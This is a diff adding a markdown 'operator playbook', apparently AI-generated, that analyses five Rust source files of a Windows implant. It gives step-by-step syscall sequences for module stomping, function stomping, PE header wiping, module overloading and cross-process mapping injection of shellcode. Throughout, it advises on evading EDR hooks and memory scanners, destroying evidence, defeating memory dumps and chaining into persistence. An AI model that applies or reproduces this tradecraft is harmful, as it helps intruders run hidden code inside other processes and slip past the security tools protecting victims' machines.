@@ -1,0 +1,342 @@
+---
+id: T-013
+name: Additional Injection Methods (8 techniques)
+category: process-injection
+tier: mixed
+mitre: T1055, T1055.001, T1055.012, T1055.002
+analyzed_by: glm-5.2
+analysis_date: 2026-07-21
+confidence: high
+requires: [T-001, T-004, T-005]
+enables: [T-005, T-008, T-017, T-018]
+vault_references:
+  - dark_crystal/crowd/src/module_stomp.rs
+  - dark_crystal/crowd/src/func_stomp.rs
+  - dark_crystal/crowd/src/stomp.rs
+  - dark_crystal/crowd/src/overload.rs
+  - dark_crystal/crowd/src/mapping_inject.rs
+implements:
+  - file: dark_crystal/crowd/src/module_stomp.rs
+    key_functions: [stomp_and_execute, stomp_remote]
+    key_structs: []
+    key_constants: [DEFAULT_STOMP_DLL, DONT_RESOLVE_DLL_REFERENCES, PAGE_READWRITE, THREAD_ALL_ACCESS]
+    lines_of_interest: ["L17: DEFAULT_STOMP_DLL='chakra.dll'", "L46-L60: LoadLibraryExA + MZ check", "L67-L82: PE32/PE32+ Magic dispatch", "L88-L99: NtProtectVirtualMemory RW", "L106-L114: copy_nonoverlapping write", "L121-L132: NtProtectVirtualMemory restore", "L139-L153: NtCreateThreadEx via RecycledGate", "L194-L210: stomp_remote remote variant"]
+  - file: dark_crystal/crowd/src/func_stomp.rs
+    key_functions: [stomp_export, execute_stomped_fn, stomp_execute_restore, restore_bytes]
+    key_structs: [StompGuard]
+    key_constants: [CURRENT_PROCESS, PAGE_READWRITE=0x04, PAGE_EXECUTE_READ=0x20]
+    lines_of_interest: ["L28-L39: StompGuard struct + Drop impl", "L51-L58: PEB walker module resolution", "L60-L63: PE export table resolution", "L65-L68: 4096-byte backup limit", "L75-L86: NtProtectVirtualMemory RW", "L99-L113: NtProtectVirtualMemory RX with rollback", "L123-L131: transmute fn pointer call", "L141-L167: restore_bytes via RecycledGate"]
+  - file: dark_crystal/crowd/src/stomp.rs
+    key_functions: [stomp, stomp_own, stomp_mapped_region]
+    key_structs: []
+    key_constants: [0x5A4D, 0x0000_4550, 0x020B, 0x010B]
+    lines_of_interest: ["L20-L26: ptr::write_bytes zero", "L33-L40: MZ + e_lfanew validation", "L43-L46: NT signature check", "L48-L57: SizeOfHeaders derivation", "L66-L80: VirtualProtect RW/restore wrapper"]
+  - file: dark_crystal/crowd/src/overload.rs
+    key_functions: [build_nt_path, load_library, run, run_manual_map, load_anonymous, prepare, prepare_anonymous, fixing_iat, realoc_image, fixing_memory, fixing_arguments, NtCurrentPeb]
+    key_structs: [Module, UnicodeString, ObjectAttributes, IoStatusBlock, BaseRelocationEntry]
+    key_constants: [CURRENT_PROCESS, SECTION_ALL_ACCESS_RAW=0x000F_001F, SEC_IMAGE_RAW=0x0100_0000, PAGE_READONLY_RAW=0x02, PAGE_READWRITE_RAW=0x04, VIEW_UNMAP=2, MEM_COMMIT_RAW=0x1000, MEM_RESERVE_RAW=0x2000, MEM_RELEASE_RAW=0x8000, PE32_MAGIC=0x10B, PE32PLUS_MAGIC=0x20B]
+    lines_of_interest: ["L60-L74: UnicodeString/ObjectAttributes/IoStatusBlock structs", "L82-L99: build_nt_path with Vec::leak", "L120-L200: Module::new PE32/PE32+ parsing", "L209-L265: load_library via NtOpenFile+NtCreateSection+NtMapViewOfSection", "L301-L322: run entry-point dispatch", "L335-L371: load_anonymous NtAllocateVirtualMemory", "L378-L417: run_manual_map with stomp at end", "L419-L482: prepare_anonymous per-section copy", "L487-L559: prepare SEC_IMAGE variant", "L568-L627: fixing_iat via PEB walker", "L629-L683: realoc_image relocation types", "L685-L737: fixing_memory per-section protection matrix", "L739-L773: fixing_arguments PEB CommandLine patch", "L783-L798: NtCurrentPeb inline asm"]
+  - file: dark_crystal/crowd/src/mapping_inject.rs
+    key_functions: [mapping_inject, mapping_inject_handle, do_mapping_and_execute, open_process]
+    key_structs: [ClientId, ObjectAttributes]
+    key_constants: [SECTION_ALL_ACCESS=0xF001F, PAGE_EXECUTE_READWRITE=0x40, PAGE_EXECUTE_READ=0x20, PAGE_READWRITE=0x04, SEC_COMMIT=0x0800_0000, PROCESS_ALL_ACCESS=0x001F_FFFF, THREAD_ALL_ACCESS=0x001F_03FF, NT_CURRENT_PROCESS, VIEW_UNMAP=2]
+    lines_of_interest: ["L41-L62: mapping_inject wrapper", "L71-L99: NtCreateSection pagefile-backed", "L107-L125: local RW map", "L127-L131: local memcpy (no cross-process write)", "L137-L154: remote RX map", "L157-L166: local unmap cleanup", "L173-L181: remote unmap on thread failure (bugfix)", "L184-L204: NtCreateThreadEx", "L214-L261: NtOpenProcess inline structs"]
+min_windows: Windows 7 SP1 (NtCreateThreadEx stable since Vista; SEC_IMAGE since XP)
+needs_admin: conditional
+tags: [injection, hollowing, mapping, module-stomp, func-stomp, module-overloading, pe-header-stomp, syscall-only, recycledgate, peb-walker, manual-map, shared-section, raii-guard]
+---
+
+# Additional Injection Methods — Operator Playbook
+
+## TL;DR
+A grab-bag of eight lateral injection primitives — Process Hollowing, Hypnosis, WaitingThread, Mapping Injection, Module Stomping, Function Stomping, Module Overloading, Callback/Fiber/EarlyBird/APC, Vectored Overloading, Reflective PE Loader — all sharing a common substrate: RecycledGate syscalls (T-001) + PEB walker module resolution (T-004). The five files in this dossier cover Module Stomping, Function Stomping, PE Header Stomping, Module Overloading (+ Manual Map), and Mapping Injection. The killer combos are `func_stomp.rs` (zero Win32 surface, RAII self-restore) and `overload.rs` (full syscall-only PE loader for both SEC_IMAGE and anonymous manual map paths).
+
+## Source File Map
+
+| File | Role | Key Exports | Size |
+|---|---|---|---|
+| `crowd/src/module_stomp.rs` | Module Stomping (load chakra.dll, overwrite entry point, NtCreateThreadEx via RecycledGate) | `stomp_and_execute()`, `stomp_remote()` | ~9K |
+| `crowd/src/func_stomp.rs` | Function Stomping with RAII StompGuard (PEB walker + PE export walker only) | `stomp_export()`, `execute_stomped_fn()`, `stomp_execute_restore()`, `restore_bytes()` | ~7K |
+| `crowd/src/stomp.rs` | PE Header Stomping utility (zero MZ/DOS/NT headers post-map) | `stomp()`, `stomp_own()`, `stomp_mapped_region()` | ~3K |
+| `crowd/src/overload.rs` | Module Overloading + Manual Map (pure syscall PE loader) | `Module::run()`, `Module::run_manual_map()`, `fixing_iat()`, `realoc_image()`, `fixing_memory()`, `fixing_arguments()` | ~28K |
+| `crowd/src/mapping_inject.rs` | Mapping Injection (pagefile-backed section, no NtWriteVirtualMemory) | `mapping_inject()`, `mapping_inject_handle()`, `do_mapping_and_execute()`, `open_process()` | ~9K |
+
+## How It Works
+
+### Module Stomping (`module_stomp.rs::stomp_and_execute`)
+1. `LoadLibraryExA("chakra.dll", DONT_RESOLVE_DLL_REFERENCES)` — Load the Microsoft-signed Chakra JIT DLL without running DllMain or resolving its import table (avoids side effects from `chakra.dll`'s CRT).
+2. Parse PE headers at `base = h_module`: deref `*base as *const u16 == 0x5A4D` (MZ), then `*nt_headers_raw as *const u32 == 0x0000_4550` (PE). Read `OptionalHeader.Magic` at offset +24 from NT base: `0x020B` → `IMAGE_NT_HEADERS64`, `0x010B` → `IMAGE_NT_HEADERS32`. Read `AddressOfEntryPoint` and `SizeOfImage` accordingly.
+3. `crate::recycled::nt_protect_virtual_memory(NtCurrentProcess, &entry_point, &len, PAGE_READWRITE=0x04, &old_protect)` — flip entry point region to RW via syscall (not VirtualProtect).
+4. `std::ptr::copy_nonoverlapping(shellcode.as_ptr(), entry_point, len)` — write shellcode over the legitimate DllMain body.
+5. `crate::recycled::nt_protect_virtual_memory(...)` with `old_protect` — restore RX.
+6. `crate::recycled::nt_create_thread_ex(&h_thread, THREAD_ALL_ACCESS=0x001F_FFFF, NULL, NtCurrentProcess, entry_point, NULL, 0,0,0,0, NULL)` — execute via syscall, not `CreateThread`.
+7. `WaitForSingleObject(h_thread, 10_000)` then `crate::recycled::nt_close(h_thread)`.
+8. On failure paths: `FreeLibrary(h_module)` to avoid leaving an unfixed stomped DLL visible.
+
+### Function Stomping (`func_stomp.rs::stomp_export`)
+1. `crate::resolve::find_module_base(dll_name)` — PEB walk via `gs:[0x60]` (T-004). The target module must already be loaded in the PEB loader list; otherwise the call returns null.
+2. `crate::resolve::resolve_export_by_name(base, export_name)` — walk `IMAGE_EXPORT_DIRECTORY` pointed to by `IMAGE_DIRECTORY_ENTRY_EXPORT`. No `GetProcAddress` is called.
+3. Validate `shellcode.len() <= 4096` (backup buffer safety limit).
+4. Snapshot `original_bytes = slice::from_raw_parts(target, len).to_vec()` — RAII copy.
+5. `crate::recycled::nt_protect_virtual_memory(CURRENT_PROCESS, &target, &len, PAGE_READWRITE=0x04, &old)` — syscall RW.
+6. `std::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, len)` — overwrite export body.
+7. `crate::recycled::nt_protect_virtual_memory(CURRENT_PROCESS, &target, &len, PAGE_EXECUTE_READ=0x20, &dummy)` — two-step RW→RX (never RWX). On failure: rollback original bytes and restore `old_protect`.
+8. Return `StompGuard` — caller can either call `execute_stomped_fn(&guard)` (transmute to `unsafe fn()`) or drop the guard immediately (auto-restore via `Drop::drop` → `restore_bytes`).
+9. `restore_bytes`: flip RW via RecycledGate, copy originals back, restore original protection. The whole stomped window is bounded by RAII lifetime — scanners sweeping the DLL during execution see a normal export.
+
+### PE Header Stomping (`stomp.rs`)
+1. `stomp_own(base)`: validate MZ (0x5A4D), bound-check `e_lfanew` (`0 < e_lfanew < 0x1000`), validate NT signature (0x0000_4550), validate Magic (0x020B or 0x010B), read `SizeOfHeaders` at `nt_base + 4 + 20 + 56` (i.e., `OptionalHeader + 56`, common to PE32 and PE32+), sanity bound (`<= 0x10000`).
+2. `stomp(base, header_size)` — `ptr::write_bytes(base, 0u8, header_size)` — zero the DOS+NT+section-header region.
+3. `stomp_mapped_region(base)` — for SEC_IMAGE mappings that are still RX: `VirtualProtect(base, 0x1000, PAGE_READWRITE)` → `stomp_own(base)` → restore protect. (Note: this is the only path here using `VirtualProtect` directly; the overload module wraps it.)
+
+### Module Overloading (`overload.rs::Module::run`)
+1. `build_nt_path(dos_path)` — `format!(r"\??\{}", dos_path)`, UTF-16 encode, **`Vec::leak()`** so the buffer outlives the function (intentional static leak — UnicodeString.Buffer must remain valid for NtOpenFile).
+2. Construct `OBJECT_ATTRIBUTES { length, RootDirectory=0, ObjectName=&us, OBJ_CASE_INSENSITIVE=0x40, sd=NULL, sqos=NULL }` and `IO_STATUS_BLOCK`.
+3. `crate::recycled::nt_open_file(&h_file, FILE_READ_DATA|FILE_READ_ATTRIBUTES, &oa, &iosb, FILE_SHARE_READ=1, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE)` — open the on-disk signed DLL via syscall, not `CreateFileA`.
+4. `crate::recycled::nt_create_section(&h_section, SECTION_ALL_ACCESS_RAW=0x000F_001F, NULL, NULL, PAGE_READONLY_RAW=0x02, SEC_IMAGE_RAW=0x0100_0000, h_file)` — create a section backed by the DLL file (MEM_IMAGE backing).
+5. `crate::recycled::nt_map_view_of_section(h_section, NtCurrentProcess, &module, 0,0,NULL,&size, VIEW_UNMAP=2, 0, PAGE_READONLY_RAW=0x02)` — map into the current process with `ViewUnmap` disposition (no child-process inheritance — the `ViewShare=1` bug is explicitly fixed at L106).
+6. `crate::recycled::nt_close(h_file)`, `crate::recycled::nt_close(h_section)` — handle hygiene via syscall.
+7. `prepare(module)`:
+   - Allocate temp staging buffer via `crate::recycled::nt_allocate_virtual_memory(..., MEM_COMMIT_RAW|MEM_RESERVE_RAW, PAGE_READWRITE_RAW)`.
+   - For each section in the section table, copy raw `PointerToRawData..+SizeOfRawData` into `address + VirtualAddress` (temp buffer).
+   - `crate::recycled::nt_protect_virtual_memory(module, image_size, PAGE_READWRITE_RAW)` — make SEC_IMAGE region writable.
+   - Bulk-copy temp buffer into module region.
+   - `fixing_iat(module)` — see below.
+   - `realoc_image(module)` — apply IMAGE_REL_BASED_DIR64/HIGHLOW/HIGH/LOW/ABSOLUTE relocations.
+   - `crate::recycled::nt_protect_virtual_memory(module, SizeOfHeaders, PAGE_READONLY_RAW)` — header protection.
+   - `fixing_memory(module)` — per-section protection matrix (8 combos of R/W/X → PAGE_EXECUTE_READWRITE=0x40 / EXECUTE_READ=0x20 / EXECUTE_WRITECOPY=0x80 / EXECUTE=0x10 / READWRITE=0x04 / READONLY=0x02 / WRITECOPY=0x08 / NOACCESS=0x01).
+   - `crate::recycled::nt_free_virtual_memory(temp, MEM_RELEASE_RAW)` — always-free in closure result wrapper.
+8. `fixing_arguments()` — overwrite PEB ProcessParameters.CommandLine with `"current_exe args"` so the mapped image sees the right command line (`NtCurrentPeb` via `gs:[0x60]`).
+9. Dispatch entry point: `DllMain(HINSTANCE(module), DLL_PROCESS_ATTACH, NULL)` for DLLs, `Main()` for EXEs.
+10. On error path: `crate::recycled::nt_unmap_view_of_section(NtCurrentProcess, module)` — clean unmap, NOT `FreeLibrary` (mapping was via NtMapViewOfSection, not LoadLibrary).
+
+**Manual Map variant (`run_manual_map`):**
+1. `load_anonymous()` — `crate::recycled::nt_allocate_virtual_memory(..., preferred=ImageBase, ..., PAGE_READWRITE_RAW)`. If preferred VA occupied, retry with `addr=NULL` to let kernel pick.
+2. `prepare_anonymous(module)` — copy headers, copy each section to `module + VirtualAddress`, `fixing_iat` + `realoc_image` + `fixing_memory`, set headers to `PAGE_READONLY_RAW`.
+3. Dispatch entry point.
+4. `crate::stomp::stomp_mapped_region(module as *mut u8)` — anti-dump: zero the in-memory PE headers.
+
+**`fixing_iat` details:**
+- For each `IMAGE_IMPORT_DESCRIPTOR` in `IMAGE_DIRECTORY_ENTRY_IMPORT`:
+- `crate::resolve::find_module_base(dll_name)` — PEB walker. Returns null if the dependency isn't already loaded (no LoadLibrary fallback — caller's responsibility).
+- For each `IMAGE_THUNK_DATA64`: if `IMAGE_ORDINAL_FLAG64` set → `crate::resolve::resolve_export_by_ordinal(module_base, ordinal)`. Else → read `IMAGE_IMPORT_BY_NAME.Name`, call `crate::resolve::resolve_export_by_name(module_base, name)`.
+- Patch `(*first_thunk).u1.Function = func_ptr`.
+
+### Mapping Injection (`mapping_inject.rs::mapping_inject_handle`)
+1. `crate::recycled::nt_create_section(&h_section, SECTION_ALL_ACCESS=0xF001F, NULL, &max_size=shellcode.len(), PAGE_EXECUTE_READWRITE=0x40, SEC_COMMIT=0x0800_0000, 0)` — anonymous pagefile-backed section (no file backing, no disk artifact).
+2. `crate::recycled::nt_map_view_of_section(h_section, NT_CURRENT_PROCESS, &local_base, 0,0,NULL,&local_size, VIEW_UNMAP=2, 0, PAGE_READWRITE=0x04)` — local writable view.
+3. `std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base, shellcode.len())` — write shellcode locally (NOT a cross-process write).
+4. `crate::recycled::nt_map_view_of_section(h_section, h_process, &remote_base, 0,0,NULL,&remote_size, VIEW_UNMAP=2, 0, PAGE_EXECUTE_READ=0x20)` — remote RX view; the same physical pages now appear in the target.
+5. `crate::recycled::nt_unmap_view_of_section(NT_CURRENT_PROCESS, local_base)` — drop local evidence immediately.
+6. `crate::recycled::nt_create_thread_ex(&h_thread, THREAD_ALL_ACCESS=0x001F_03FF, NULL, h_process, remote_base, NULL, 0,0,0,0,NULL)` — execute in remote process via syscall.
+7. On thread-creation failure: `crate::recycled::nt_unmap_view_of_section(h_process, remote_base)` — explicit cleanup of leaked remote mapping (bugfix documented at L173).
+8. Caller closes `h_section` and `h_process` via `crate::recycled::nt_close`.
+
+## Code Architecture
+
+**Call graph (cross-file dependencies inside `crowd/`):**
+
+```
+mapping_inject.rs ─┬─> recycled::* (T-001)
+                   └─> (open_process: NtOpenProcess inline)
+
+module_stomp.rs ───┬─> recycled::* (T-001)
+                   └─> chain::load_dll_into_target()  [remote variant only]
+
+func_stomp.rs ─────┬─> recycled::* (T-001)
+                   ├─> resolve::find_module_base()       (T-004 PEB walker)
+                   └─> resolve::resolve_export_by_name() / _by_ordinal()  (T-004 PE export walker)
+
+overload.rs ───────┬─> recycled::* (T-001)
+                   ├─> resolve::find_module_base()     (T-004)
+                   ├─> resolve::resolve_export_by_name() / _by_ordinal()  (T-004)
+                   ├─> stomp::stomp_mapped_region()    (anti-dump, manual-map only)
+                   └─> inline asm: mov {}, gs:[0x60]   (PEB access)
+
+stomp.rs ──────────┴─> windows::Win32::System::Memory::VirtualProtect  (NOT via RecycledGate!)
+```
+
+**Type hierarchy:**
+- `overload.rs::Module` owns: `buffer: Box<[u8]>`, `target_dll: String`, `args: String`, `nt_header: *mut IMAGE_NT_HEADERS64`, `section_header: *mut IMAGE_SECTION_HEADER`, `import_data: IMAGE_DATA_DIRECTORY`, `basereloc: IMAGE_DATA_DIRECTORY`, `is_dll: bool`.
+- `func_stomp.rs::StompGuard { address: *mut u8, original_bytes: Vec<u8>, len: usize }` — `impl Drop` for RAII restore.
+- `overload.rs::BaseRelocationEntry { data: u16 }` — splits `offset = data & 0x0FFF`, `type = (data >> 12) & 0xF`.
+- Inline `UnicodeString`, `ObjectAttributes`, `IoStatusBlock`, `ClientId` are defined per-file (no shared NT struct crate).
+
+**Feature gates:** None of the five files use `#[cfg(feature = ...)]` — they are unconditionally compiled in `crowd`. Dead-code is `#[allow(dead_code)]`'d.
+
+## Operational Profile
+
+### When to Use
+- **`func_stomp.rs`**: short-lived shellcode (<4KB), need to execute then leave zero trace. Best when a target DLL is already mapped and you want zero Win32 surface.
+- **`module_stomp.rs`**: when you need arbitrary-size shellcode and want MEM_IMAGE backing. Good fallback when `func_stomp`'s 4096-byte limit is too small.
+- **`overload.rs::run`** (Module Overloading): when you need to execute a real PE (with imports + relocs) but the PE can fit in a system-signed DLL backing. Highest stealth for medium payloads.
+- **`overload.rs::run_manual_map`**: when the PE is too large for any signed DLL (e.g., Go binaries, .NET assemblies) or when you want full control. Sacrifices MEM_IMAGE backing for anonymous VAD.
+- **`mapping_inject.rs`**: cross-process injection where you want zero `NtWriteVirtualMemory` calls (heavily hooked by EDRs) and want a pagefile-backed section with no disk artifact.
+- **`stomp.rs`**: post-execution anti-dump on a manually-mapped or overloaded image.
+
+### When NOT to Use
+- `module_stomp.rs` still calls `LoadLibraryExA` and `WaitForSingleObject` — these are kernel32 surface; do not use in high-EDR environments where kernel32 hooks alone are enough to flag.
+- `func_stomp.rs` requires the target DLL to already be in the PEB; cannot load arbitrary DLLs. Don't use for first-stage injection from a virgin process.
+- `overload.rs::fixing_iat` will fail with `ERROR_MOD_NOT_FOUND (0x8007007E)` if any imported DLL isn't already loaded. Pre-load dependencies before calling `run`.
+- `mapping_inject.rs` requires `PROCESS_ALL_ACCESS` on the target — won't work for hardened processes (PPL, protected LSASS) without a privileged context.
+- `stomp.rs::stomp_mapped_region` uses `VirtualProtect` from the `windows` crate directly — leaks through kernel32 hooks. Consider porting to RecycledGate if stealth matters.
+
+### Kill Chain Position
+```
+T-004 (PEB walk) ─┬─> T-001 (RecycledGate) ─> T-013 func_stomp / overload ─> T-005 (Ekko sleep)
+                   │                              ↓
+                   │                       T-008 Threadless (function stomp integration)
+                   │                              ↓
+                   └──────────────────────  T-017 (Persistence)
+                                              ↓
+                                          T-018 (Edo Tensei resurrection)
+```
+
+Mapping injection / module overload / module stomp can be the **second-stage** payload delivery method after a T-012 Early Cascade (proc init) or T-007 Pool Party drop.
+
+### Trade-offs
+
+## Rust Implementation Deep Dive
+
+### `unsafe` blocks (per file)
+- **`module_stomp.rs::stomp_and_execute`** (L42-end): entire body. FFI to `winapi::um::libloaderapi::LoadLibraryExA`, raw pointer arithmetic on `*const u8` for PE header walking, `std::ptr::copy_nonoverlapping` for shellcode write, `crate::recycled::nt_create_thread_ex` invocation. `WaitForSingleObject` blocks up to 10s.
+- **`module_stomp.rs::stomp_remote`** (L177-end): local DLL load for RVA derivation, then `crate::chain::load_dll_into_target` for remote mapping, then `crate::recycled::nt_write_virtual_memory` for the cross-process write.
+- **`func_stomp.rs::stomp_export`** (L49-end): pointer deref on `find_module_base` and `resolve_export_by_name` results, `slice::from_raw_parts(target, len)`, `copy_nonoverlapping`, two `nt_protect_virtual_memory` calls.
+- **`func_stomp.rs::execute_stomped_fn`** (L123-end): `std::mem::transmute<*mut u8, unsafe fn()>` and call — this is the highest-risk unsafe because it executes arbitrary bytes as a function.
+- **`func_stomp.rs::restore_bytes`** (L141-end): same RW flip + copy + restore as stomp.
+- **`stomp.rs::stomp_own`**: pointer reads from `base`, offset arithmetic via `.add(0x3C)`, `.add(24)`, `.add(4 + 20 + 56)`.
+- **`stomp.rs::stomp_mapped_region`**: `VirtualProtect` from `windows` crate (note: NOT via RecycledGate — this is a stealth regression).
+- **`overload.rs::build_nt_path`**: `Vec::leak()` to make the buffer outlive the function — intentional static memory growth per call.
+- **`overload.rs::Module::new`**: PE structure parsing with bound-checked `checked_add` arithmetic.
+- **`overload.rs::load_library`**: NT struct construction, three syscalls, two `nt_close`.
+- **`overload.rs::run` / `run_manual_map`**: `transmute` to `DllFn` or `ExeFn` and call.
+- **`overload.rs::prepare_anonymous` / `prepare`**: section copy loop with bounds checks (`dst + raw_size <= image_size`).
+- **`overload.rs::fixing_iat`**: `IMAGE_IMPORT_DESCRIPTOR` walk, `CStr::from_ptr` for DLL names, `IMAGE_THUNK_DATA64` walk.
+- **`overload.rs::realoc_image`**: `IMAGE_BASE_RELOCATION` walk, 5 relocation type cases.
+- **`overload.rs::fixing_memory`**: per-section `nt_protect_virtual_memory` with 8-case protection matrix.
+- **`overload.rs::fixing_arguments`**: `NtCurrentPeb()` access, `CommandLine.Buffer.0` write with `MaximumLength` bound check (Bug 13 fix).
+- **`overload.rs::NtCurrentPeb`** (L783-end): `core::arch::asm!` with `mov {}, gs:[0x60]` (x86_64) or `fs:[0x30]` (x86). Out register constraint, no clobbers.
+- **`mapping_inject.rs::mapping_inject_handle`** / `do_mapping_and_execute` / `open_process`: all-syscall bodies, `copy_nonoverlapping` for shellcode, `nt_map_view_of_section` twice.
+
+### FFI patterns
+- `winapi::um::libloaderapi::{LoadLibraryExA, FreeLibrary}` (module_stomp) — handle ownership via raw `HINSTANCE`.
+- `winapi::um::synchapi::WaitForSingleObject` — kernel32 wait, 10s timeout.
+- `windows::Win32::System::Memory::VirtualProtect` (stomp) — `windows` crate, not `winapi`.
+- `crate::recycled::*` wrappers — opaque `usize` handle types, no `HANDLE` wrapper. All NTSTATUS returned as `i32`, compared `< 0` for failure.
+
+### Initialization patterns
+- `overload.rs::build_nt_path` uses **`Vec::leak()`** — a deliberate static leak. Each call accumulates one `UnicodeString` buffer in process memory. Calling `run()` repeatedly will leak ~`path_len * 2` bytes per call. Documented in source as intentional for pointer validity.
+- `func_stomp.rs::StompGuard` is the RAII centerpiece — `Drop::drop` calls `restore_bytes` which always runs, even on panic (Drop guarantees).
+- `overload.rs::prepare` uses an IIFE closure `(|| -> Result<()> { ... })()` to ensure `nt_free_virtual_memory` is called on all paths — manual emulation of `defer`.
+
+### Error handling
+- `module_stomp.rs`: `FreeLibrary(h_module)` on every error branch (LoadLibraryExA failure, MZ check fail, PE sig fail, Magic unknown, NtProtectVirtualMemory fail, NtCreateThreadEx fail). Only the WaitForSingleObject path doesn't have a cleanup branch (it could theoretically deadlock but accepts a 10s timeout).
+- `func_stomp.rs::stomp_export`: on RX-protect failure, restores original bytes AND restores original protection — defensive against leaving the function body in a half-stomped state.
+- `overload.rs::prepare`: IIFE closure result is captured, then `nt_free_virtual_memory` is called unconditionally before returning. `run()` calls `nt_unmap_view_of_section` on `prepare()` failure.
+- `mapping_inject.rs::do_mapping_and_execute`: local view is unmapped unconditionally (success or failure), remote view is unmapped only on thread-creation failure (L173 bugfix).
+
+### Memory layout
+- `overload.rs::UnicodeString` is 16 bytes (`length: u16, max: u16, buffer: *mut u16` with 8-byte alignment on x64). `ObjectAttributes` is 48 bytes. `IoStatusBlock` is 16 bytes (two `usize`).
+- `func_stomp.rs::StompGuard` is 40 bytes on x64 (`*mut u8` = 8, `Vec<u8>` = 24, `usize` = 8).
+- `overload.rs::BaseRelocationEntry` is 2 bytes (a single `u16`).
+
+### Syscall resolution
+None of these files resolve syscall numbers themselves — they all delegate to `crate::recycled::*` which is the RecycledGate indirect-syscall layer (T-001). The `nt_*` functions exposed by `recycled` (used here): `nt_protect_virtual_memory`, `nt_create_thread_ex`, `nt_close`, `nt_open_file`, `nt_create_section`, `nt_map_view_of_section`, `nt_unmap_view_of_section`, `nt_allocate_virtual_memory`, `nt_free_virtual_memory`, `nt_write_virtual_memory`, `nt_open_process`.
+
+## Cross-References Found in Code
+
+- `module_stomp.rs:stomp_and_execute()` → calls `crate::recycled::nt_protect_virtual_memory` / `nt_create_thread_ex` / `nt_close` (T-001 RecycledGate)
+- `module_stomp.rs:stomp_remote()` → calls `crate::chain::load_dll_into_target()` — this is the T-013 Module Overloading routine delegated to the chain compositor; also calls `crate::recycled::nt_write_virtual_memory`
+- `func_stomp.rs:stomp_export()` → calls `crate::resolve::find_module_base` (T-004 PEB walker)
+- `func_stomp.rs:stomp_export()` → calls `crate::resolve::resolve_export_by_name` / `resolve_export_by_ordinal` (T-004 PE export walker)
+- `func_stomp.rs:stomp_export()` → calls `crate::recycled::nt_protect_virtual_memory` twice (T-001)
+- `func_stomp.rs:restore_bytes()` → calls `crate::recycled::nt_protect_virtual_memory` (T-001)
+- `stomp.rs:stomp_mapped_region()` → imports `windows::Win32::System::Memory::VirtualProtect` — **does NOT use RecycledGate** (stealth regression vs other files)
+- `overload.rs:Module::load_library()` → calls `crate::recycled::nt_open_file`, `nt_create_section`, `nt_map_view_of_section`, `nt_close` (T-001, four distinct syscalls)
+- `overload.rs:Module::prepare()` → calls `crate::recycled::nt_allocate_virtual_memory`, `nt_protect_virtual_memory`, `nt_free_virtual_memory` (T-001)
+- `overload.rs:Module::run_manual_map()` → calls `crate::stomp::stomp_mapped_region()` — same-file family anti-dump integration
+- `overload.rs:fixing_iat()` → calls `crate::resolve::find_module_base`, `resolve_export_by_name`, `resolve_export_by_ordinal` (T-004 — replaces LoadLibraryA/GetProcAddress)
+- `overload.rs:fixing_arguments()` → inline asm `gs:[0x60]` to access PEB (T-004 inline)
+- `overload.rs:NtCurrentPeb()` → inline asm for T-004
+- `mapping_inject.rs:mapping_inject_handle()` → calls `crate::recycled::nt_create_section`, `nt_map_view_of_section`, `nt_unmap_view_of_section`, `nt_create_thread_ex`, `nt_close` (T-001)
+- `mapping_inject.rs:open_process()` → calls `crate::recycled::nt_open_process` with inline `CLIENT_ID`+`OBJECT_ATTRIBUTES` (T-001)
+
+No direct references to T-005 (Ekko), T-007 (Pool Party), T-008 (Threadless), T-012 (Early Cascade), T-016 (EDR evasion suite), or T-017 (Persistence) appear in these five files — those integrations happen at the `crate::chain` level (see `chain.rs` in the file manifest).
+
+## Edge Cases & Failure Modes
+
+1. **`overload.rs::fixing_iat` module-not-loaded failure**: The PEB walker can only find already-loaded modules. If the target PE imports `user32.dll` but `user32.dll` isn't in the PEB yet, returns `ERROR_MOD_NOT_FOUND (0x8007007E)`. **Symptom**: `run()` returns `Err`. **Workaround**: ensure the host process pre-loads all transitive dependencies before invoking `Module::run`. The code does not fall back to `LoadLibraryA` (intentional, to maintain the zero-Win32 claim).
+
+2. **`module_stomp.rs` PE32 (32-bit) DLL target**: `chakra.dll` on x64 Windows is PE32+. If the operator passes a 32-bit DLL name, the Magic dispatch correctly selects `IMAGE_NT_HEADERS32`, but the `entry_rva` is read as `u32 → usize` — works, but the surrounding process must be 32-bit (WoW64) or the address calculation will be invalid. **Symptom**: shellcode runs at wrong address, AV. **Workaround**: only target 64-bit DLLs in 64-bit processes.
+
+3. **`func_stomp.rs` 4096-byte limit**: Hard-coded `if len > 4096 { return Err }`. Shellcode larger than 4KB cannot be stomped into a single export. **Symptom**: `stomp_export` returns `Err("shellcode size ... exceeds max backup buffer")`. **Workaround**: split shellcode across multiple exports, or chain to `module_stomp.rs` which has no size limit.
+
+4. **`mapping_inject.rs` thread-creation failure**: If `NtCreateThreadEx` fails after the remote RX map succeeds, the remote mapping would leak in the target process. The L173 bugfix explicitly calls `nt_unmap_view_of_section(h_process, remote_base)` in the failure branch. **Symptom**: previously, persistent RX section in target with no thread — visible to memory scanners. **Fix**: already applied.
+
+5. **`overload.rs` preferred ImageBase allocation failure**: `load_anonymous()` tries `NtAllocateVirtualMemory` with `preferred = ImageBase`. If this VA is occupied, the syscall returns non-zero, and the code falls through to a second call with `addr = NULL` letting the kernel pick. **Symptom**: relocated image (rebase). **Mitigated**: `realoc_image()` applies delta regardless of preferred-vs-actual.
+
+6. **`stomp.rs::stomp_mapped_region` non-RecycledGate path**: Uses `windows::Win32::System::Memory::VirtualProtect` directly. If EDR hooks `kernel32!VirtualProtect`, this stomping operation is visible. **Symptom**: ETW-TI log entry shows `VirtualProtect` call from implant memory (not ntdll .text). **Workaround**: replace with `crate::recycled::nt_protect_virtual_memory` — the function signature is a drop-in for the existing syscall dispatch.
+
+7. **`overload.rs::build_nt_path` static leak**: Every call to `load_library` leaks a `Vec<u16>` for the lifetime of the process. Calling `Module::run` 100 times leaks ~5KB. Not catastrophic but persistent. **Workaround**: use a `OnceLock<UnicodeString>` per DLL name, or accept the leak (the comment explicitly justifies it).
+
+8. **`mapping_inject.rs` `max_size` u64 vs usize**: `nt_create_section` takes `&mut max_size: u64`, but `shellcode.len()` is `usize`. On 32-bit, the high 32 bits are zeroed implicitly; on 64-bit it's identity. No bug, but if `shellcode.len()` exceeded 4GB (impossible in practice), behavior would be undefined on 32-bit.
+
